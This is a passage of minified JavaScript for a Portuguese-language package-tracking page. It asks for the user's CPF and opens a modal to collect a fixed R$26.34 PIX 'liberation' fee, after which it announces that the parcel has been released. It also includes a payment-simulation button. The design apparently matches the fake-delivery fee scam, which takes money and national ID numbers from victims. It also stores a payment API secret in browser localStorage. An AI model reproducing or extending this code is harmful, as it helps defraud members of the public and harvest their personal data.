banco:",t)}}showSuccessNotification(){const e=document.createElement("div");if(e.className="payment-success-notification",e.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,e.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `,document.body.appendChild(e),!document.getElementById("notificationAnimations")){const t=document.createElement("style");t.id="notificationAnimations",t.textContent=`
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(t)}setTimeout(()=>{e.parentNode&&e.remove()},5e3)}displayStaticPixModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="flex",document.body.style.overflow="hidden",setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("⚠️ Modal PIX estático exibido como fallback")}guideToCopyButton(){const e=document.getElementById("copyPixButtonModal"),t=document.querySelector(".pix-copy-section");if(e&&t){t.style.position="relative";const o=document.createElement("div");o.className="copy-guide-indicator",o.innerHTML="👆 Copie o código PIX aqui",o.style.cssText=`
                position: absolute;
                top: -35px;
                right: 0;
                background: #ff6b35;
                color: white;
                padding: 8px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
                animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
                z-index: 10;
                white-space: nowrap;
                box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            `,t.appendChild(o),t.style.animation="highlightSection 3s ease",setTimeout(()=>{t.scrollIntoView({behavior:"smooth",block:"center"})},200),setTimeout(()=>{o.parentNode&&o.remove(),t.style.animation=""},6e3)}}closeModal(e){const t=document.getElementById(e);t&&(t.style.display="none",document.body.style.overflow="auto")}toggleAccordion(){const e=document.getElementById("detailsContent"),t=document.querySelector(".toggle-icon");!e||!t||(e.classList.contains("expanded")?(e.classList.remove("expanded"),t.classList.remove("rotated")):(e.classList.add("expanded"),t.classList.add("rotated")))}copyPixCode(e,t){const o=document.getElementById(e),a=document.getElementById(t);if(!(!o||!a))try{o.select(),o.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(o.value).then(()=>{console.log("✅ PIX copiado via Clipboard API:",o.value.substring(0,50)+"..."),this.showCopySuccess(a)}).catch(()=>{this.fallbackCopy(o,a)}):this.fallbackCopy(o,a)}catch(i){console.error("❌ Erro ao copiar PIX:",i),l.showError("Erro ao copiar código PIX. Tente selecionar e copiar manualmente.")}}fallbackCopy(e,t){try{if(document.execCommand("copy"))console.log("✅ PIX copiado via execCommand:",e.value.substring(0,50)+"..."),this.showCopySuccess(t);else throw new Error("execCommand falhou")}catch(o){console.error("❌ Fallback copy falhou:",o),l.showError("Erro ao copiar. Selecione o texto e use Ctrl+C.")}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}handleAutoFocus(){if(new URLSearchParams(window.location.search).get("focus")==="cpf"){setTimeout(()=>{const a=document.getElementById("cpfInput");if(a){const i=document.querySelector(".tracking-hero");i&&l.scrollToElement(i,0),setTimeout(()=>{a.focus(),/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&(a.setAttribute("inputmode","numeric"),a.setAttribute("pattern","[0-9]*"),a.click())},800)}},100);const o=window.location.pathname;window.history.replaceState({},document.title,o)}}clearOldData(){try{Object.keys(localStorage).forEach(t=>{t.startsWith("tracking_")&&localStorage.removeItem(t)})}catch(e){console.error("Erro ao limpar dados antigos:",e)}}saveTrackingData(){if(this.currentCPF&&this.trackingData)try{localStorage.setItem(`tracking_${this.currentCPF}`,JSON.stringify(this.trackingData))}catch(e){console.error("Erro ao salvar dados:",e)}}getFirstAndLastName(e){const t=e.trim().split(" ");return console.log("🔍 Processando nome completo:",e),console.log("🔍 Nomes separados:",t),t.length===1?(console.log("✅ Nome único encontrado:",t[0]),t[0]):`${t[0]} ${t[t.length-1]}`}updateElement(e,t){console.log(`🔄 Tentando atualizar elemento '${e}' com texto:`,t);const o=document.getElementById(e);if(o){const a=o.textContent;o.textContent=t,console.log(`✅ Elemento '${e}' atualizado:`),console.log(`   Texto anterior: "${a}"`),console.log(`   Texto novo: "${t}"`)}else console.error(`❌ Elemento '${e}' não encontrado no DOM`),console.log("🔍 Elementos disponíveis:",Array.from(document.querySelectorAll("[id]")).map(a=>a.id))}showElement(e){const t=document.getElementById(e);t&&(t.style.display="block")}setZentraPayApiSecret(e){const t=this.zentraPayService.setApiSecret(e);return t?console.log("✅ API Secret Zentra Pay configurada com sucesso"):console.error("❌ Falha ao configurar API Secret Zentra Pay"),t}}window.setZentraPayApiSecret=function(u){return window.trackingSystemInstance?window.trackingSystemInstance.setZentraPayApiSecret(u):(window.ZENTRA_PAY_SECRET_KEY=u,localStorage.setItem("zentra_pay_secret_key",u),console.log("🔑 API Secret armazenada para uso posterior"),!0)};window.valor_em_reais=26.34;(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let u;function e(){console.log("=== INICIALIZANDO PÁGINA DE RASTREAMENTO APRIMORADA ===");try{if(P.init(),console.log("✓ Navegação inicializada"),!u){const n=new URLSearchParams(window.location.search).get("origem")==="vega";u=new I,window.trackingSystemInstance=u,console.log("✓ Sistema de rastreamento aprimorado criado")}a(),console.log("✓ Header scroll configurado"),o(),t(),console.log("=== PÁGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===")}catch(i){console.error("❌ Erro na inicialização da página de rastreamento:",i),setTimeout(e,2e3)}}function t(){const i=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");i&&i!=="SUA_SECRET_KEY_AQUI"&&u?(u.setZentraPayApiSecret(i),console.log("✓ API Secret Zentra Pay configurada automaticamente")):console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")')}function o(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(n=>{document.getElementById(n)?console.log(`✓ Elemento encontrado: ${n}`):console.warn(`⚠️ Elemento não encontrado: ${n}`)})}function a(){window.addEventListener("scroll",function(){const i=document.querySelector(".header");i&&(i.style.backgroundColor="rgba(255, 255, 255, 0.1)",i.style.backdropFilter="blur(10px)")})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("📅 Aguardando DOMContentLoaded")):(e(),console.log("📄 DOM já carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
